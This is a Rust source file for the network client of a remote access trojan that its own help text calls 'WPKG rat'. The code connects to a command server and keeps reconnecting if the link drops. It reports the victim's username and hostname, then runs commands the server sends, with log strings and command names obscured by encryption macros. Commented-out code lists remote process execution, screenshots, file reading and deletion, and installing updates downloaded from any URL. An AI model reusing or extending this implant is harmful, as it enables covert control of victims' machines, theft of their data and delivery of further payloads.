use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::{Arc, Mutex};
use std::time::{Duration, SystemTime};
use std::{thread, time};

use anyhow::Result;
use async_recursion::async_recursion;
use lazy_static::lazy_static;
use tracing::{error, info};
use wpkg_crypto::decode;

use crate::commands::CommandsManager;
use crate::info_crypt;
use crate::unwrap::CustomUnwrap;
use crate::{crypto, error_crypt, globals};

lazy_static! {
    pub static ref COMMANDS: CommandsManager = CommandsManager::new();
}

#[async_recursion(?Send)]
pub async fn connect(addr: String) {
    // connect to the ServerD
    match Client::new(addr.clone()) {
        Ok(mut client) => {
            info_crypt!("Connected!");

            // reconnect if error
            if let Err(err) = client.run().await {
                error!("Unexpected error {}", err);

                // wait 10 seconds before reconnect
                thread::sleep(time::Duration::from_secs(10));
                // reconnect
                connect(addr).await;
            }
        }

        // reconnect to the server
        Err(_e) => {
            error_crypt!("Unable to connect to the server. Reconnecting...");

            // wait 10 seconds before reconnect
            thread::sleep(time::Duration::from_secs(10));

            // reconnect
            connect(addr).await;
        }
    }
}

pub struct Client {
    stream: TcpStream,
    connected: bool,
    address: String,
    reconnecting: bool,
}

impl Client {
    pub fn new(address: String) -> Result<Self> {
        // connect to the server
        let stream = TcpStream::connect(address.clone())?;

        Ok(Self {
            stream,
            connected: true,
            address,
            reconnecting: false,
        })
    }

    pub fn receive(&mut self) -> Result<String> {
        // allocate an empty buffer
        let mut data = [0; 65536];

        // read buffer
        let len = self.stream.read(&mut data)?;

        // get buffer without "empty" bytes
        let recv_buf = &data[0..len];

        // parse buffer into String
        let buf_str = String::from_utf8(recv_buf.to_vec())?;

        info!("{}: {}", crypto!("[Recived]"), buf_str);

        Ok(buf_str)
    }

    pub fn rawdata_recieve(&mut self) -> Result<Vec<u8>> {
        // allocate an empty buffer
        let mut data = [0; 65536];

        // read buffer
        let len = self.stream.read(&mut data)?;

        // get buffer without "empty" bytes
        let recv_buf = &data[0..len];

        Ok(recv_buf.to_vec())
    }

    pub fn rawdata_send(&mut self, message: &[u8]) -> Result<()> {
        self.stream.write_all(message)?;

        Ok(())
    }

    /// Send a message to the server
    pub fn send(&mut self, message: &str) -> Result<()> {
        info!("{}: {}", crypto!("[Sended]"), message);

        // send message to the server
        self.stream.write_all(message.to_string().as_bytes())?;

        Ok(())
    }

    /// Send command to the server
    pub fn send_command(&mut self, message: &str) -> Result<String> {
        // send command
        self.send(message)?;

        // recive command output
        self.receive()
    }

    pub fn check_args(&mut self, args: Vec<&str>, length: usize) -> Result<bool> {
        if args.len() < length {
            self.send("Missing arguments")?;
            return Ok(false);
        } else if args.len() < length {
            self.send("Too much arguments")?;
            return Ok(false);
        }

        Ok(true)
    }

    //detecting computer suspend and reconnecting
    fn suspend_handler(&mut self) -> anyhow::Result<()> {
        let arc_connected = Arc::new(Mutex::new(self.connected));
        let tcp_stream = self.stream.try_clone()?;

        tokio::spawn(async move {
            info_crypt!("Starting suspend detecting system...");

            while *Arc::clone(&arc_connected).lock().unwrap() {
                let time: u64 = 1;

                let before = SystemTime::now();
                thread::sleep(Duration::from_secs(time));
                let now = before.elapsed().unwrap();

                if now.as_secs() > time {
                    info_crypt!("Suspend detected... Reconnecting...");
                    tcp_stream.shutdown(std::net::Shutdown::Both).unwrap_log();
                    return;
                }
            }
        });

        Ok(())
    }

    /// Close the connection
    pub fn close(&mut self) -> Result<()> {
        self.connected = false;

        self.stream.shutdown(std::net::Shutdown::Both)?;

        Ok(())
    }

    #[async_recursion]
    pub async fn run(&mut self) -> anyhow::Result<()> {
        self.suspend_handler()?;

        // setup client name
        self.send_command(
            format!("/setname {}@{}", whoami::username(), whoami::hostname()).as_str(),
        )?;

        // setting version in server
        self.send_command(format!("/about {}", globals::CURRENT_VERSION).as_str())?;

        while self.connected {
            // receive message from the server
            let buf = self.receive()?;

            if buf.is_empty() {
                return if self.reconnecting {
                    Ok(())
                } else {
                    self.send("empty buffer received")
                    //Err(anyhow!(crypto!("Client crashed, reconnecting")))
                };
            }

            async fn handle(client: &mut Client, buf: String) -> anyhow::Result<()> {
                // split message
                let command = buf.split_ascii_whitespace().collect::<Vec<&str>>();

                // parse args to Vec
                let mut args = command[0..command.len()].to_vec();

                let cmd = args[0];

                // remove command name from args
                args = args[1..args.len()].to_vec();

                // find command
                let command = COMMANDS
                    .commands
                    .iter()
                    .enumerate()
                    .find(|&(_i, command)| decode(command.name()) == cmd);

                if let Some((_i, cmd)) = command {
                    if cmd.min_args() < args.len() {
                        client.send("Missing arguments for the command.")?;

                        return Ok(());
                    }

                    cmd.execute(client, args).await?;
                } else {
                    //client.send("unknown command")?;
                }

                Ok(())
            }

            if let Err(err) = handle(self, buf).await {
                error!("Unexpected error in message handler: {}", err);
                self.send("Unexpected error")?;
            }

            //                 "run" => {
            //                     if args.clone().is_empty() {
            //                         self.send("Missing argument")?;
            //                     } else {
            //                         let a = if args.len() <= 1 {
            //                             vec![""]
            //                         } else {
            //                             args[1..args.len()].to_vec()
            //                         };
            //                         utils::run_process(args[0], a, false)?;
            //                         self.send("Done")?;
            //                     }
            //                 }

            //                 "reconnect" => {
            //                     if self.check_args(args.clone(), 2)? {
            //                         match Client::new(format!("{}:{}", args[0], args[1])) {
            //                             Ok(mut client) => {
            //                                 info!(
            //                                     "{} {}: {}",
            //                                     crypto!("Reconnected succesfully to"),
            //                                     args[0],
            //                                     args[1]
            //                                 );

            //                                 self.send(&crypto!(
            //                                     "Succesfully reconnected client... disconnecting..."
            //                                 ))?;
            //                                 self.send_command("/disconnect")?;

            //                                 self.reconnecting = true;

            //                                 self.close()?;

            //                                 client.run().await?;
            //                             }
            //                             Err(_e) => {
            //                                 let msg = crypto!("Error reconnecting to server");

            //                                 error!(msg);
            //                                 self.send(&msg)?;
            //                             }
            //                         }
            //                     }
            //                 }

            //                 "screenshot" => {
            //                     let url = utils::screenshot_url().await?;

            //                     self.send(&url)?;
            //                 }

            //                 // disconnect from the server
            //                 "disconnect" => {
            //                     self.send("Done")?;

            //                     self.send_command("/disconnect")?;
            //                     self.close()?;
            //                 }

            //                 "check-updates" => match updater::check_updates().await {
            //                     Ok((up_to_date, new_version, url)) => {
            //                         if !up_to_date {
            //                             self.send(&format!("{} {}", crypto!("Disconnecting & starting update... because new version founded"), new_version))?;

            //                             self.send("/disconnect")?;

            //                             if let Err(err) = updater::update(&url).await {
            //                                 error!("{}: {err}", crypto!("Updating failed"));
            //                             }
            //                         } else {
            //                             self.send(&crypto!("WPKG is up to date!"))?;
            //                         }
            //                     }

            //                     Err(e) => {
            //                         let msg = format!("{} {}", crypto!("Failed to check updates"), e);

            //                         error!("{msg}");

            //                         self.send(&msg)?;
            //                     }
            //                 },

            //                 "dev-update" => {
            //                     if self.check_args(args.clone(), 1)? {
            //                         self.send(&crypto!("Installing developer build... Disconnecting..."))?;

            //                         self.send("/disconnect")?;

            //                         if let Err(err) = updater::update(args[0]).await {
            //                             error!("{}: {}", crypto!("Updating failed"), err)
            //                         }
            //                     }
            //                 }

            //                 "ping" => self.send("ping-received")?,

            //                 "version" => self.send(globals::CURRENT_VERSION)?,

            //                 // send help message
            //                 "help" => {
            //                     let help = crypto!(
            //                         "
            // stat - sending pc stats (CPU, RAM and Swap)
            // run <process> <args> - run process
            // reconnect <ip> <port> - reconnecting to another ServerD
            // screenshot - make screenshot and sending url
            // disconnect - disconnecting ServerD Client
            // check-updates - Checking updates
            // dev-update <url> - Downloading and installing custom versin
            // ping - sending ping
            // version - get version of WPKG rat
            // help - showing help
            // cd <dir> - changing d
            // pwd - showing directory
            // ls - list files in dir
            // mkdir <name> - creating folder
            // rm <name> - removing file
            // cat <name> - reading file
            // "
            //                     );

            //                     self.send(&help)?;
            //                 }
            //                 _ => self.send(&crypto!("Unknown command"))?,
            //             }
        }

        Ok(())
    }
}

/// "Correctly" close connection
impl Drop for Client {
    #[allow(unused_must_use)]
    fn drop(&mut self) {
        self.send_command("/disconnect");
        self.close().unwrap_log();
    }
}
